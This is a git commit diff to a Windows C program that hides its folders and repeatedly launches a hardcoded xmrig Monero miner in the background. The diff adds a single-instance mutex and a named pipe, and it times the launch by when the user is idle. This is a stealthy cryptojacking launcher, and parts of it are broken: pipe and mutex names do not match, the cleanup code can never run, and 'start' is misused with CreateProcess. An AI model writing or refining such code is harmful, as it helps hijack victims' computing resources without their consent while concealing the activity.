fd0c90865e7927216b3b6343a2efd9eaef3ba195
briviamoon <briviamoon@gmail.com>
2023-11-08 00:00:42 +0300

    Fix Infinite Precesses Threading

--- Initialize.c
+++ Initialize.c
@@ -1,13 +1,16 @@
 #include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
+#include <stdbool.h>
+#include <process.h>
 
 void setFolderHidden(const char *folderPath);
+bool isAlreadyRunning();
 
 /**
  * setFolderHidden - hides Folder in dir.
  * @folderPath: path to folder.
-*/
+ */
 void setFolderHidden(const char *folderPath)
 {
 	DWORD attributes = GetFileAttributesA(folderPath);
@@ -19,22 +22,64 @@ void setFolderHidden(const char *folderPath)
 	}
 }
 
-int main(int argc, char **argv)
+bool isAlreadyRunning()
 {
+	HANDLE mutex = CreateMutex(NULL, TRUE, "MyProgramMutex");
+	if (GetLastError() == ERROR_ALREADY_EXISTS || GetLastError() == ERROR_ACCESS_DENIED)
+	{
+		CloseHandle(mutex);
+		return true;
+	}
+
+	HANDLE pipe = CreateFile(
+		"\\\\.\\pipe\\MyProgramPipe",
+		GENERIC_WRITE,
+		0,
+		NULL,
+		OPEN_EXISTING,
+		0,
+		NULL);
+
+	if (pipe != INVALID_HANDLE_VALUE)
+	{
+		CloseHandle(pipe);
+		return true;
+	}
+
+	return false;
+}
+
+int main(void)
+{
+	if (isAlreadyRunning())
+	{
+		return (0);
+	}
+
+	/*Create a named pipe to block other instances from running.*/
+	HANDLE pipe = CreateNamedPipe(
+		"\\\\.\\pipe\\myProgramPipe",
+		PIPE_ACCESS_OUTBOUND,
+		PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
+		1,
+		0,
+		0,
+		0,
+		NULL);
+
+	if (pipe == INVALID_HANDLE_VALUE)
+	{
+		return 1;
+	}
+
 	char currentDir[MAX_PATH];
 	char targetDir[MAX_PATH];
-
-	if (argc < 1)
-	{
-		perror("Usage: %s <PATH>", argv[0]);
-		exit(EXIT_FAILURE);
-	}
 
 	/*Get the path of the currently running program.*/
 	GetModuleFileName(NULL, currentDir, MAX_PATH);
 
 	/*Replace "your_program_to_start.exe" with the name of the targeted program.*/
-	const char *targetProgramName = *argv[1];
+	const char *targetProgramName = "C:\\Users\\user\\Desktop\\Crypto-Miners\\MONERO\\Windows\\xmrig.exe";
 
 	/*Find the path to the folder containing the targeted program.*/
 	GetModuleFileName(NULL, targetDir, MAX_PATH);
@@ -49,36 +94,43 @@ int main(int argc, char **argv)
 	setFolderHidden(currentDir);
 	setFolderHidden(targetDir);
 
-	printf("Folders are now hidden.\n");
 
-	// Check system idle time.
-	LASTINPUTINFO lii;
-	lii.cbSize = sizeof(LASTINPUTINFO);
-	DWORD lastInput = 0;
+	bool commandExecuted = false;
 
 	while (1)
 	{
-		if (GetLastInputInfo(&lii))
+		if (!commandExecuted)
 		{
-			if (lastInput != lii.dwTime)
+			/*Check system idle time.*/
+			LASTINPUTINFO lii;
+			lii.cbSize = sizeof(LASTINPUTINFO);
+			DWORD lastInput = 0;
+
+			if (GetLastInputInfo(&lii))
 			{
-				/*Computer is in use. Run the program in the background with 25% resources.*/
-				char cmd[256];
-				snprintf(cmd, sizeof(cmd), "start /B /low \"%s\"", currentDir);
-				system(cmd);
+				if (lastInput != lii.dwTime)
+				{
+					/* Computer is in use. Run the program in the background with 25% resources. */
+					char cmd[256];
+					snprintf(cmd, sizeof(cmd), "start /B /low \"%s\"", currentDir);
+					STARTUPINFO si = {sizeof(si)};
+					PROCESS_INFORMATION pi;
+					if (CreateProcess(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
+					{
+						WaitForSingleObject(pi.hProcess, INFINITE);
+						CloseHandle(pi.hProcess);
+						CloseHandle(pi.hThread);
+					}
+					commandExecuted = true;
+				}
 			}
-			else
-			{
-				/*Computer is idle. Run the program in the background with 75% resources.*/
-				char cmd[256];
-				snprintf(cmd, sizeof(cmd), "start /B /high \"%s\"", currentDir);
-				system(cmd);
-			}
-			lastInput = lii.dwTime;
 		}
-		/*Check every second.*/
 		Sleep(1000);
 	}
 
-	return 0;
+	/*Release the named pipe and the mutex before exiting.*/
+	CloseHandle(pipe);
+	CloseHandle(CreateMutex(NULL, TRUE, "myProgramMutex"));
+
+	return (0);
 }
